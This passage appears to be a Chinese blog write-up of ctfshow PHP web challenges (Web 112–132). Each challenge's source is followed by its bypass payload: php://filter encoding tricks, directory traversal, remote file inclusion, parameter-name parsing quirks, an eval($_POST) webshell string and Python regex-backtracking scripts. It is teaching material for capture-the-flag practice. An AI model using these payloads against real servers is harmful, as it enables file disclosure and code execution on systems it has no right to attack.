<p><img src="https://i.loli.net/2021/08/02/jsdzfwvOeMl69aU.png" alt="image-20210802083840803"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array(8) &#123;  [<span class="string">&quot;_GET&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;_POST&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;_COOKIE&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;_FILES&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;GLOBALS&quot;</span>]=&gt;  array(8) &#123;    [<span class="string">&quot;_GET&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;_POST&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;_COOKIE&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;_FILES&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;GLOBALS&quot;</span>]=&gt;    *RECURSION*    [<span class="string">&quot;a&quot;</span>]=&gt;    int(123)    [<span class="string">&quot;b&quot;</span>]=&gt;    int(456)    [<span class="string">&quot;c&quot;</span>]=&gt;    string(4) <span class="string">&quot;asdf&quot;</span>  &#125;  [<span class="string">&quot;a&quot;</span>]=&gt;  int(123)  [<span class="string">&quot;b&quot;</span>]=&gt;  int(456)  [<span class="string">&quot;c&quot;</span>]=&gt;  string(4) <span class="string">&quot;asdf&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload?v1=ctfshow&amp;v2=GLOBALS# 将 $GLOBALS 赋值给 v2 , v2 再赋值给 v1 , 然后再 var_dump($v1)，就相当于 var_dump($GLOBALS)</span></span><br></pre></td></tr></table></figure>

<h2 id="1-21-Web-112-—-各种编码绕过-convert-iconv-UCS-2LE-UCS-2BE"><a href="#1-21-Web-112-—-各种编码绕过-convert-iconv-UCS-2LE-UCS-2BE" class="headerlink" title="1.21 Web 112 — 各种编码绕过 convert.iconv.UCS-2LE.UCS-2BE"></a>1.21 Web 112 — 各种编码绕过 convert.iconv.UCS-2LE.UCS-2BE</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);<span class="keyword">function</span> filter(<span class="variable">$file</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;        die(<span class="string">&quot;hacker!&quot;</span>);    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">return</span> <span class="variable">$file</span>;    &#125;&#125;<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;    highlight_file(filter(<span class="variable">$file</span>));&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phpecho iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;</span>);<span class="comment"># ?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php# 得到 f$al=gc&quot;fthswod&#123;3c00bd-8cf124-2b-53b4da-72598e1bb4&#125;7;&quot;# 解码得到 flag</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">https://www.php.net/manual/zh/mbstring.supported-encodings.php</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 另解?file=php://filter/resource=flag.php?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php?file=compress.zlib://flag.php#?file=compress.bzip2://flag.php# 别的一些编码绕过?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php?file=compress.zlib://flag.php?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h2 id="1-22-Web-113-—-proc-self-root-多次重复"><a href="#1-22-Web-113-—-proc-self-root-多次重复" class="headerlink" title="1.22 Web 113 — /proc/self/root 多次重复"></a>1.22 Web 113 — /proc/self/root 多次重复</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);<span class="keyword">function</span> filter(<span class="variable">$file</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;        die(<span class="string">&#x27;hacker!&#x27;</span>);    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">return</span> <span class="variable">$file</span>;    &#125;&#125;<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;    highlight_file(filter(<span class="variable">$file</span>));&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 过滤 filter 可使用 zlib?file=compress.zlib://flag.php</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 另解?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php# /proc/self/root 在 Linux 当中是指向根目录的  多次重复可绕过# ls /proc/self/root 得到的将会是根目录的文件</span></span><br></pre></td></tr></table></figure>

<h2 id="1-23-Web-114-—-filter"><a href="#1-23-Web-114-—-filter" class="headerlink" title="1.23 Web 114 — filter"></a>1.23 Web 114 — filter</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);	<span class="keyword">function</span> filter(<span class="variable">$file</span>)&#123;  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;        die(<span class="string">&#x27;hacker!&#x27;</span>);    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">return</span> <span class="variable">$file</span>;    &#125;&#125;<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="built_in">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;<span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;    highlight_file(filter(<span class="variable">$file</span>));&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!&quot;</span>;&#125; 师傅们居然tql都是非预期 哼！</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># filter 未被过滤?file=php://filter/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h2 id="1-24-Web-115-—-trim-0c-绕过"><a href="#1-24-Web-115-—-trim-0c-绕过" class="headerlink" title="1.24 Web 115 — trim() %0c 绕过"></a>1.24 Web 115 — trim() %0c 绕过</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phpinclude(<span class="string">&#x27;flag.php&#x27;</span>);highlight_file(__FILE__);error_reporting(0);<span class="keyword">function</span> filter(<span class="variable">$num</span>)&#123;    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="built_in">return</span> <span class="variable">$num</span>;&#125;<span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];<span class="keyword">if</span>(is_numeric(<span class="variable">$num</span>) and <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> and trim(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> and filter(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;        <span class="built_in">echo</span> <span class="variable">$flag</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">echo</span> <span class="string">&quot;hacker!!&quot;</span>;    &#125;&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;&#125; hacker!!!</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/02/DmW7bvf2sIPgEi3.png" alt="image-20210802092037807"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 测试&lt;?phpfor ($i=0; $i &lt;=128 ; $i++) &#123;     $x=chr($i).&#x27;1&#x27;;   if(trim($x)!==&#x27;1&#x27; &amp;&amp;  is_numeric($x))&#123;        echo urlencode(chr($i)).&quot;\n&quot;;   &#125;&#125;# %0C %2B - . 0 1 2 3 4 5 6 7 8 9 </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?num=%0c36</span><br></pre></td></tr></table></figure>

<h2 id="1-25-Web-123-—-a-SERVER-‘argv’"><a href="#1-25-Web-123-—-a-SERVER-‘argv’" class="headerlink" title="1.25 Web 123 — $a=$_SERVER[‘argv’];"></a>1.25 Web 123 — $a=$_SERVER[‘argv’];</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=18)&#123;         <span class="built_in">eval</span>(<span class="string">&quot;<span class="variable">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);           <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;             <span class="built_in">echo</span> <span class="variable">$flag</span>;         &#125;    &#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 变量名应该只有 字母、数字、下划线# GET 或 POST方式传进去的变量名,会自动将 空格 + . [ 转换为 _ ，重点是 仅仅替换一次</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payloadfun=echo $flag&amp;CTF_SHOW=1&amp;CTF[SHOW.COM=2fun=$fl0g=%27flag_give_me%27&amp;CTF_SHOW=1&amp;CTF[SHOW.COM=2	#不行CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=var_dump($GLOBALS)			#不行</span></span><br></pre></td></tr></table></figure>

<p><strong>$a=$_SERVER[‘argv’];</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、cli模式（命令行）下	第一个参数<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][0]是脚本名，其余的是传递给脚本的参数2、web网页模式下	在web页模式下必须在php.ini开启register_argc_argv配置项	    设置register_argc_argv = On(默认是Off)，重启服务，<span class="variable">$_SERVER</span>[‘argv’]才会有效果    这时候的<span class="variable">$_SERVER</span>[‘argv’][0] = <span class="variable">$_SERVER</span>[‘QUERY_STRING’]    <span class="variable">$argv</span>,<span class="variable">$argc</span>在web模式下不适用</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 预期解get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])# 测试&lt;?php$a=$_SERVER[&#x27;argv&#x27;];var_dump($a);传入 a=1+fl0g=flag_give_me结果如下array(2) &#123; [0]=&gt; string(3) &quot;a=1&quot; [1]=&gt; string(17) &quot;fl0g=flag_give_me&quot; &#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 另解POST CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])GET /?$fl0g=flag_give_meGET:?$fl0g=flag_give_mePOST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0])</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 测试 Web php.ini开启register_argc_argv配置项 | 设置register_argc_argv = On</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/ryjIeQWb8ZNisG4.png" alt="image-20210802110015478"></p>
<p><img src="https://i.loli.net/2021/08/02/58yCAMVZ7b1dK9N.png" alt="image-20210802110039649"></p>
<h2 id="1-26-Web-125-—-a-SERVER-‘argv’"><a href="#1-26-Web-125-—-a-SERVER-‘argv’" class="headerlink" title="1.26 Web 125 — $a=$_SERVER[‘argv’];"></a>1.26 Web 125 — $a=$_SERVER[‘argv’];</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=16)&#123;         <span class="built_in">eval</span>(<span class="string">&quot;<span class="variable">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;             <span class="built_in">echo</span> <span class="variable">$flag</span>;         &#125;    &#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str(<span class="variable">$a</span>[1])</span><br></pre></td></tr></table></figure>

<h2 id="1-27-Web-126-—-a-SERVER-‘argv’"><a href="#1-27-Web-126-—-a-SERVER-‘argv’" class="headerlink" title="1.27 Web 126 — $a=$_SERVER[‘argv’];"></a>1.27 Web 126 — $a=$_SERVER[‘argv’];</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; strlen(<span class="variable">$c</span>)&lt;=16)&#123;         <span class="built_in">eval</span>(<span class="string">&quot;<span class="variable">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);           <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;             <span class="built_in">echo</span> <span class="variable">$flag</span>;         &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str(<span class="variable">$a</span>[1])</span><br></pre></td></tr></table></figure>

<h2 id="1-28-Web-127-—-extract-GET-和-空格-绕过"><a href="#1-28-Web-127-—-extract-GET-和-空格-绕过" class="headerlink" title="1.28 Web 127 — extract($_GET); 和 空格 绕过 _"></a>1.28 Web 127 — extract($_GET); 和 空格 绕过 <code>_</code></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);include(<span class="string">&quot;flag.php&quot;</span>);highlight_file(__FILE__);<span class="variable">$ctf_show</span> = md5(<span class="variable">$flag</span>);<span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];//特殊字符检测<span class="keyword">function</span> waf(<span class="variable">$url</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;</span>|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//<span class="string">&#x27;, $url))&#123;        return true;    &#125;else&#123;        return false;    &#125;&#125;if(waf($url))&#123;    die(&quot;嗯哼？&quot;);&#125;else&#123;    extract($_GET);&#125;if($ctf_show===&#x27;</span>ilove36d<span class="string">&#x27;)&#123;    echo $flag;&#125;</span></span><br></pre></td></tr></table></figure>

<p>‘QUERY_STRING’</p>
<p>query string（查询字符串），如果有的话，通过它进行页面访问。</p>
<p><a href="https://www.php.net/manual/zh/reserved.variables.server.php">https://www.php.net/manual/zh/reserved.variables.server.php</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># + [ . 空格 会变成 _ # extract($_GET); 的作用即是将我们的 GET 传入的参数变成实打实的变量?ctf show=ilove36d</span></span><br></pre></td></tr></table></figure>

<h2 id="1-29-Web-128-—-gettext-扩展-—-get-defined-vars"><a href="#1-29-Web-128-—-gettext-扩展-—-get-defined-vars" class="headerlink" title="1.29 Web 128 — gettext 扩展 — get_defined_vars()"></a>1.29 Web 128 — gettext 扩展 — get_defined_vars()</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);include(<span class="string">&quot;flag.php&quot;</span>);highlight_file(__FILE__);<span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];<span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];<span class="keyword">if</span>(check(<span class="variable">$f1</span>))&#123;    var_dump(call_user_func(call_user_func(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;&#125;<span class="keyword">function</span> check(<span class="variable">$str</span>)&#123;    <span class="built_in">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);&#125; NULL</span><br></pre></td></tr></table></figure>

<p><strong>gettext 扩展</strong></p>
<ul>
<li>查看php 扩展目录下是否有 <code>php_gettext.dll</code></li>
<li>修改 <code>php.ini</code>     <code>extension=php_gettext.dll</code> 去掉注释</li>
</ul>
<p><img src="https://i.loli.net/2021/08/02/VJki8tAr4S25wo1.png" alt="image-20210802111723747"></p>
<p><img src="https://i.loli.net/2021/08/02/qVudQDK9zj1y8iP.png" alt="image-20210802111900412"></p>
<p><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">php 下的 gettext 扩展使用</a></p>
<p>测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phpecho gettext(<span class="string">&#x27;phpinfo&#x27;</span>);<span class="built_in">echo</span> _(<span class="string">&#x27;phpinfo&#x27;</span>);?&gt;<span class="comment"># 如果是未定义的字符，则将会返回原字符串root@kali:/var/www/html/learn# vi 3.phproot@kali:/var/www/html/learn# php 3.php phpinfophpinfo</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">get_defined_vars( void) : array返回由所有已定义变量所组成的数组 <span class="comment"># 测试&lt;?php$a = get_defined_vars();print_r($a);?&gt;# 返回Array(    [_GET] =&gt; Array        (            [ctfshow] =&gt; ilove36d        )    [_POST] =&gt; Array        (        )    [_COOKIE] =&gt; Array        (        )    [_FILES] =&gt; Array        (        )    [test] =&gt; Success!)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/02/y2R1eQ6kUjBhsAw.png" alt="image-20210802113056976"></p>
<p><img src="https://i.loli.net/2021/08/02/gzAUSiO4LIex8pJ.png" alt="image-20210802112724073"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars<span class="comment"># 解释var_dump(call_user_func(call_user_func($f1,$f2)));var_dump(call_user_func(call_user_func(&#x27;_&#x27;,&#x27;get_defined_vars&#x27;)));var_dump(call_user_func(get_defined_vars));</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/02/pji4IDPfbUcwMG6.png" alt="image-20210802113207015"></p>
<h2 id="1-30-Web-129-—-GET-中必须含有某内容"><a href="#1-30-Web-129-—-GET-中必须含有某内容" class="headerlink" title="1.30 Web 129 — GET 中必须含有某内容"></a>1.30 Web 129 — GET 中必须含有某内容</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;0)&#123;        <span class="built_in">echo</span> readfile(<span class="variable">$f</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stripos() <span class="comment"># 查找字符串在另一字符串中第一次出现的位置（不区分大小写）,从0开始</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解一# 远程文件包含 在自己的服务器上写上一句话 test.txt?f=http://url/test.txt?ctfshow</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解二# filter 伪协议?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解三# 目录穿越?f=/ctfshow/../../../../../var/www/html/flag.php</span></span><br></pre></td></tr></table></figure>

<h2 id="1-31-Web-130-—-正则最大回溯次数绕过"><a href="#1-31-Web-130-—-正则最大回溯次数绕过" class="headerlink" title="1.31 Web 130 — 正则最大回溯次数绕过"></a>1.31 Web 130 — 正则最大回溯次数绕过</h2><p><a href="https://www.jb51.net/article/49631.htm">https://www.jb51.net/article/49631.htm</a></p>
<p><img src="https://i.loli.net/2021/08/02/w3FPDeNUHBTigRu.png" alt="image-20210802120920025"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">very very very（省略25万个very）ctfshow</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;        die(<span class="string">&#x27;bye!&#x27;</span>);    &#125;    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === FALSE)&#123;        die(<span class="string">&#x27;bye!!&#x27;</span>);    &#125;    <span class="built_in">echo</span> <span class="variable">$flag</span>;&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>考察点：<strong>利用正则最大回溯次数绕过</strong></p>
<p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requestsurl=<span class="string">&quot;http://039253c3-1444-428e-9301-1eadc5f79ab4.challenge.ctf.show:8080/&quot;</span>data=&#123;	<span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*250000+<span class="string">&#x27;ctfshow&#x27;</span>&#125;r=requests.post(url,data=data)<span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/02/xq3CMlAumonI9ZU.png" alt="image-20210802115252780"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 非预期解f=ctfshowf[]=ctfshow</span></span><br></pre></td></tr></table></figure>

<h2 id="1-32-Web-131-—-正则最大回溯次数绕过"><a href="#1-32-Web-131-—-正则最大回溯次数绕过" class="headerlink" title="1.32 Web 131 — 正则最大回溯次数绕过"></a>1.32 Web 131 — 正则最大回溯次数绕过</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;    <span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;        die(<span class="string">&#x27;bye!&#x27;</span>);    &#125;    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === FALSE)&#123;        die(<span class="string">&#x27;bye!!&#x27;</span>);    &#125;    <span class="built_in">echo</span> <span class="variable">$flag</span>;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requestsurl=<span class="string">&quot;http://4a5d7bd2-7fc7-4a6f-90bd-8eef9693bf0a.challenge.ctf.show:8080/&quot;</span>data=&#123;    <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*250000+<span class="string">&#x27;36Dctfshow&#x27;</span>&#125;r=requests.post(url,data=data)<span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h2 id="1-33-Web-132-—-false-amp-amp-false-username-”admin”"><a href="#1-33-Web-132-—-false-amp-amp-false-username-”admin”" class="headerlink" title="1.33 Web 132 — false &amp;&amp; false || $username ===”admin”"></a>1.33 Web 132 — false &amp;&amp; false || $username ===”admin”</h2><p>一个 Web 页面</p>
<p>扫描后台</p>
<p><img src="https://i.loli.net/2021/08/02/4sFSywvTBbjpfLm.png" alt="image-20210802121650250"></p>
